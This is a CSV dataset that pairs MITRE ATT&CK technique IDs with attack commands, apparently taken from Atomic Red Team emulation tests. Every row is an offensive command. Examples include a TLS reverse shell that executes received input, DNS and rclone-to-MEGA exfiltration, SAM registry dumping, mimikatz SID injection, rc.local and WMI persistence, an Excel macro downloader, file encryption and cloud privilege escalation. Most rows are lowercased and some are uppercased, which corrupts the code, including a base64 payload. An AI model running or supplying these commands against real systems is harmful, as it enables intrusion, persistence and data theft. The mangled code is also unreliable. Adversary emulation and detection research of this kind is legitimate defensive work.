mitre_id,command
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1021,"set-itemproperty -path 'hklm:\system\currentcontrolset\control\terminal server\winstations\rdp-tcp' -name ""portnumber"" -value #{new_remote_port} new-netfirewallrule -displayname 'rdpportlatest-tcp-in' -profile 'public' -direction inbound -action allow -protocol tcp -localport #{new_remote_port}"
T1134,"#{mimikatz_path} ""privilege::debug"" ""sid::patch"" ""sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}"" ""exit"""
T1202,"# copy command to clipboard set-clipboard -value '#{command}' # open run dialog start-process -filepath ""powershell"" -argumentlist ""-c (new-object -comobject 'shell.application').filerun()"" -windowstyle hidden # wait for run dialog to open start-sleep -seconds 1 # paste command and execute add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait('^v') start-sleep -milliseconds 500 [system.windows.forms.sendkeys]::sendwait('{enter}') # id_2416"
T1546,"$filterargs = @{name='atomicredteam-wmipersistence-activescripteventconsumer-example'; eventnamespace='root\cimv2'; querylanguage=""wql""; query=""select * from __instancemodificationevent within 60 where targetinstance isa 'win32_perfformatteddata_perfos_system' and targetinstance.systemuptime >= 240 and targetinstance.systemuptime < 325""}; $filter=set-wmiinstance -class __eventfilter -namespace ""root\subscription"" -arguments $filterargs $consumerargs = @{name='atomicredteam-wmipersistence-activescripteventconsumer-example'; scriptingengine='vbscript'; scripttext=' set objws = createobject(""wscript.shell"") objws.run ""notepad.exe"", 0, true '} $consumer=set-wmiinstance -namespace ""root\subscription"" -class activescripteventconsumer -arguments $consumerargs $filtertoconsumerargs = @{ filter = $filter; consumer = $consumer; } $filtertoconsumerbinding = set-wmiinstance -namespace 'root/subscription' -class '__filtertoconsumerbinding' -arguments $filtertoconsumerargs   "
T1005,"cd $home curl -o #{remote_url}/art curl -o #{remote_url}/gta.db curl -o #{remote_url}/sqlite_dump.sh chmod +x sqlite_dump.sh find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""sqlite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;  "
T1003,reg save HKLM\SAM C:\Users\Public\dump
T1082,csrutil status
T1098,aws iam create-group --group-name #{username} aws iam add-user-to-group --user-name #{username} --group-name #{username}
T1074,"compress-archive -path ""#{input_file}"" -destinationpath #{output_file} -force   "
T1546,"new-item -path 'hkcu:\software\classes\clsid\#{clsid}' -value '#{clsid_description}' new-item -path 'hkcu:\software\classes\clsid\#{clsid}\inprocserver32' -value ""#{dll_path}"" new-itemproperty -path 'hkcu:\software\classes\clsid\#{clsid}\inprocserver32' -name 'threadingmodel' -value '#{clsid_threading}' -propertytype ""string"" start-process -filepath ""c:\windows\system32\rundll32.exe"" -argumentlist '-localserver #{clsid}'"
T1037,"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi [ ""$(uname)"" = 'freebsd' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmubg9jywwgpiavdg1wl1qxmdm3ljawnc5yyy5sb2nhbccpcgo='))\"""" | sudo tee -a /etc/rc.local printf 'exit 0' | sudo tee -a /etc/rc.local sudo chmod +x /etc/rc.local   "
T1049,get-nettcpconnection
T1560,"which_python=`which python || which python3` $which_python -c ""from zipfile import zipfile; zipfile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')"" # id_5451"
T1195,"copy %temp%\explorersync.db %temp%\..\microsoft\explorersync.db schtasks /create /tn explorersync /tr ""javaw -jar %temp%\..\microsoft\explorersync.db"" /sc minute /f   "
T1222,mkdir #{file_or_folder} >nul 2>&1 echo t1222.001_attrib1 >> #{file_or_folder}\t1222.001_attrib1.txt echo t1222.001_attrib2 >> #{file_or_folder}\t1222.001_attrib2.txt attrib.exe +h #{file_or_folder}\t1222.001_attrib1.txt attrib.exe +h #{file_or_folder}\t1222.001_attrib2.txt
T1654,POWERSHELL -C {GET-EVENTLOG 'SECURITY' | WHERE {$_.MESSAGE -LIKE '*SYSTEM*'} | EXPORT-CSV $ENV:TEMP\T1654_EVENTS.TXT}
T1187,"& ""#{petitpotam_path}"" #{captureserverip} #{targetserverip} #{efsapi} write-host ""end of petitpotam attack"""
T1041,"$dnsserver = ""#{dns_server}"" $exfiltrateddata = ""#{exfiltrated_data}"" $chunksize = #{chunk_size} $encodeddata = [system.text.encoding]::utf8.getbytes($exfiltrateddata) $encodeddata = [convert]::tobase64string($encodeddata) $chunks = $encodeddata -split ""(.{$chunksize})"" foreach ($chunk in $chunks) { $dnsquery = $chunk + ""."" + $dnsserver resolve-dnsname -name $dnsquery start-sleep -seconds 5 } "
T1580,AWS EC2 DESCRIBE-SECURITY-GROUPS --PROFILE #{AWS_PROFILE} --OUTPUT #{OUTPUT_FORMAT}
T1571,echo quit | telnet #{domain} #{port} exit 0 
T1114,"$ss = convertto-securestring ""#{password}"" -asplaintext -force $cred = new-object pscredential -argumentlist '#{username}', $ss $param = @{ credential = $cred force = $true } $null = connect-azaccount @param $token = (get-azaccesstoken -resourcetypename msgraph -erroraction stop).token $cert = new-selfsignedcertificate -subject ""cn=powershell application"" -certstorelocation ""cert:\currentuser\my"" -keyexportpolicy exportable -keyspec signature -keylength 2048 -keyalgorithm rsa -hashalgorithm sha256 $reqresourceaccess = ( @{ ""resourceaccess"" = (@{""id""= ""570282fd-fa5c-430d-a7fd-fc8dc98a9dca""; ""type""= ""scope""}, @{ ""id""= ""7427e0e9-2fba-42fe-b0c0-848c9e6a8182""; ""type""= ""scope""}, @{""id""= ""37f7f235-527c-4136-accd-4a02d197296e""; ""type""= ""scope""}, @{""id""= ""14dad69e-099b-42c9-810b-d002981feec1""; ""type""= ""scope""}, @{ ""id""= ""e1fe6dd8-ba31-4d61-89e7-88639da4683d""; ""type""= ""scope""}, @{ ""id""= ""810c84a8-4a9e-49e6-bf7d-12d183f40d01""; ""type""= ""role""}); ""resourceappid"" = ""00000003-0000-0000-c000-000000000000"" }) connect-mggraph -accesstoken $token $context = get-mgcontext $users = get-mguser $app = new-mgapplication -displayname ""t1114.002 atomic test #1 - office365 - remote email collection"" -requiredresourceaccess $reqresourceaccess -web @{ redirecturis=""http://localhost""; } -keycredentials @(@{ type=""asymmetricx509cert""; usage=""verify""; key=$cert.rawdata }) new-mgserviceprincipal -appid $app.appid -additionalproperties @{} | out-null $resourcespn = get-mgserviceprincipal -filter ""appid eq '$($app.appid)'"" $graphapiapp = get-mgserviceprincipal -filter ""displayname eq 'microsoft graph'"" $mailrole = $graphapiapp.approles|where-object value -eq ""mail.read"" new-mgserviceprincipalapproleassignment -serviceprincipalid $resourcespn.id -principalid $resourcespn.id -resourceid $graphapiapp.id -approleid $mailrole.id $mailbox1 = ""#{1st_target_mailbox}"" $mailbox2 = ""#{2nd_target_mailbox}"" $mailbox3 = ""#{3rd_target_mailbox}"" [system.collections.arraylist]$selectusers = @() foreach ($user in $users) {if (($user.mail -eq $mailbox1) -or ($user.mail -eq $mailbox2) -or ($user.mail -eq $mailbox3)){$selectusers.add($user.id)}} connect-mggraph -clientid $app.appid -tenantid $context.tenantid -certificatename $cert.subjectname.name foreach ($user in $selectusers) { $url= ""https://graph.microsoft.com/v1.0/users/$($user)/messages"" ; invoke-mggraphrequest -uri $url -method get -outputtype psobject} # id_5403"
T1573,"$SERVER_IP = #{SERVER_IP} $SERVER_PORT = #{SERVER_PORT} $SOCKET = NEW-OBJECT NET.SOCKETS.TCPCLIENT('#{SERVER_IP}', '#{SERVER_PORT}') $STREAM = $SOCKET.GETSTREAM() $SSLSTREAM = NEW-OBJECT SYSTEM.NET.SECURITY.SSLSTREAM($STREAM,$FALSE,({$TRUE} -AS [NET.SECURITY.REMOTECERTIFICATEVALIDATIONCALLBACK])) $SSLSTREAM.AUTHENTICATEASCLIENT('FAKEDOMAIN.EXAMPLE', $NULL, ""TLS12"", $FALSE) $WRITER = NEW-OBJECT SYSTEM.IO.STREAMWRITER($SSLSTREAM) $WRITER.WRITE('PS ' + (PWD).PATH + '> ') $WRITER.FLUSH() [BYTE[]]$BYTES = 0..65535|%{0}; WHILE(($I = $SSLSTREAM.READ($BYTES, 0, $BYTES.LENGTH)) -NE 0) {$DATA = (NEW-OBJECT -TYPENAME SYSTEM.TEXT.ASCIIENCODING).GETSTRING($BYTES,0, $I); $SENDBACK = (IEX $DATA | OUT-STRING ) 2>&1; $SENDBACK2 = $SENDBACK + 'PS ' + (PWD).PATH + '> '; $SENDBYTE = ([TEXT.ENCODING]::ASCII).GETBYTES($SENDBACK2); $SSLSTREAM.WRITE($SENDBYTE,0,$SENDBYTE.LENGTH);$SSLSTREAM.FLUSH()}"
T1140,"mkdir ""#{output_dir}"" >nul 2>&1 echo hello from atomic red team > ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" makecab ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" ""#{cab_path}"" pushd ""#{output_dir}"" expand ""#{cab_path}"" -f:* . popd  "
T1056,"auditctl -a always,exit -f arch=b64 -s execve -k cmds auditctl -a always,exit -f arch=b32 -s execve -k cmds whoami; ausearch -i --start now"
T1037,sudo cp #{path_startup_params} /library/startupitems/startupparameters.plist sudo cp #{path_malicious_script} /library/startupitems/atomic.sh sudo cp #{path_malicious_plist} /tmp/t1037_005_daemon.plist sudo /library/startupitems/atomic.sh start
T1039,"copy-item -path ""\\#{remote}\c$\#{share_file}"" -destination ""$env:temp\#{local_file}"" "
T1057,get-wmiobject -class win32_process # id_2132
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"""
T1119,sc query type=service > %temp%\t1119_1.txt doskey /history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt 
T1197,start-bitstransfer -priority foreground -source #{remote_file} -destination #{local_file} 
T1187,rpcping -s #{server_ip} -e #{custom_port} /a connect /u ntlm 1>$null
T1014,"sudo modprobe #{rootkit_name} ping -c 10 localhost >/dev/null & targetpid=""$!"" ps $targetpid kill -31 $targetpid ps $targetpid || echo ""process ${targetpid} hidden""   "
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { $connectionstring = az storage account show-connection-string --name ""#{storage_account_name}"" --query connectionstring --output tsv # download blob for cleanup $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + ""#{blob_name}"") az storage blob download --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file $tmporiginalfunctioncode --overwrite true if ($lastexitcode -eq 0) { # upload new blob version if download of existing blob succeeded az storage blob upload --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file ""#{file_path_blob}"" --overwrite true } else { write-output ""download original function code failed."" exit 1 } }"
T1567,"new-item #{rclone_config_path}\rclone -itemtype directory new-item #{rclone_config_path}\rclone\rclone.conf cd ""#{rclone_path}"" .\rclone.exe config create #{remote_share} mega set-content #{rclone_config_path}\rclone\rclone.conf ""[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}"" .\rclone.exe copy --max-size 1700k ""#{dir_to_copy}"" #{remote_share}:test -v # id_8090"
T1124,"reg query ""hklm\system\currentcontrolset\control\timezoneinformation"" /v timezonekeyname   "
T1204,"$fname = ""$env:temp\atomic_redteam_x4m_exec.vbs"" $fname1 = ""$env:temp\procexp.exe"" if (test-path $fname) { remove-item $fname remove-item $fname1 } $xlapp = new-object -comobject ""excel.application"" $xlapp.visible = $true $xlapp.displayalerts = $false $xlbook = $xlapp.workbooks.add() $sheet = $xlbook.excel4macrosheets.add() if (""#{uname}"" -ne """") { $sheet.cells.item(1,1) = ""#{uname}"" } else { $sheet.cells.item(1,1) = ""=get.workspace(26)"" } $sheet.cells.item(2,1) = ""procexp.exe"" $sheet.cells.item(3,1) = ""atomic_redteam_x4m_exec.vbs"" $sheet.cells.item(4,1) = ""=if(isnumber(search(`""64`"",get.workspace(1))), goto(a5),)"" $sheet.cells.item(5,1) = ""=fopen(`""c:\users\`""&a1&`""\appdata\local\temp\`""&a3&`""`"", 3)"" $sheet.cells.item(6,1) = ""=fwriteln(a5, `""url = `""`""#{download_url}`""`""`"")"" $sheet.cells.item(7,1) = ""=fwriteln(a5, `""`"")"" $sheet.cells.item(8,1) = ""=fwriteln(a5, `""set winhttp = createobject(`""`""winhttp.winhttprequest.5.1`""`"")`"")"" $sheet.cells.item(9,1) = ""=fwriteln(a5, `""winhttp.open `""`""get`""`"", url, false`"")"" $sheet.cells.item(10,1) = ""=fwriteln(a5, `""winhttp.send`"")"" $sheet.cells.item(11,1) = ""=fwriteln(a5, `""if winhttp.status = 200 then`"")"" $sheet.cells.item(12,1) = ""=fwriteln(a5, `""set ostream = createobject(`""`""adodb.stream`""`"")`"")"" $sheet.cells.item(13,1) = ""=fwriteln(a5, `""ostream.open`"")"" $sheet.cells.item(14,1) = ""=fwriteln(a5, `""ostream.type = 1`"")"" $sheet.cells.item(15,1) = ""=fwriteln(a5, `""ostream.write winhttp.responsebody`"")"" $sheet.cells.item(16,1) = ""=fwriteln(a5, `""ostream.savetofile `""`""c:\users\`""&a1&`""\appdata\local\temp\`""&a2&`""`""`"", 2`"")"" $sheet.cells.item(17,1) = ""=fwriteln(a5, `""ostream.close`"")"" $sheet.cells.item(18,1) = ""=fwriteln(a5, `""end if`"")"" $sheet.cells.item(19,1) = ""=fclose(a5)"" $sheet.cells.item(20,1) = ""=exec(`""explorer.exe c:\users\`""&a1&`""\appdata\local\temp\`""&a3&`""`"")"" $sheet.cells.item(21,1) = ""=wait(now()+`""00:00:05`"")"" $sheet.cells.item(22,1) = ""=exec(`""explorer.exe c:\users\`""&a1&`""\appdata\local\temp\`""&a2&`""`"")"" $sheet.cells.item(23,1) = ""=halt()"" $sheet.cells.item(1,1).name = ""runme"" $xlapp.run(""runme"") $xlapp.quit() [system.runtime.interopservices.marshal]::releasecomobject($xlbook) | out-null [system.runtime.interopservices.marshal]::releasecomobject($xlapp) | out-null [system.gc]::collect() [system.gc]::waitforpendingfinalizers() remove-variable xlbook remove-variable xlapp  "
T1486,which_openssl=`which openssl` $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size} $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path} $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}  
T1221,"start ""#{docx_file}"" "
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f # id_1220
T1098,"import-module -name az.resources $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azaccount -credential $credential $user = get-azaduser | where-object {$_.displayname -eq ""#{user_principal_name}"" -or $_.userprincipalname -eq ""#{user_principal_name}"" } if ($user -eq $null) { write-warning ""user not found""; exit } $subscription = get-azsubscription | where-object {$_.name -eq ""#{subscription}""} if ($subscription -eq $null) { write-warning ""subscription not found""; exit } $role = get-azroledefinition | where-object {$_.name -eq ""#{role_name}""} if ($role -eq $null) { write-warning ""role not found""; exit } new-azroleassignment -objectid $user.id -roledefinitionid $role.id -scope /subscriptions/$subscription write-host ""user $($user.displayname) was added to $($role.name) role in subscriptions $($subscriptions.name)"""
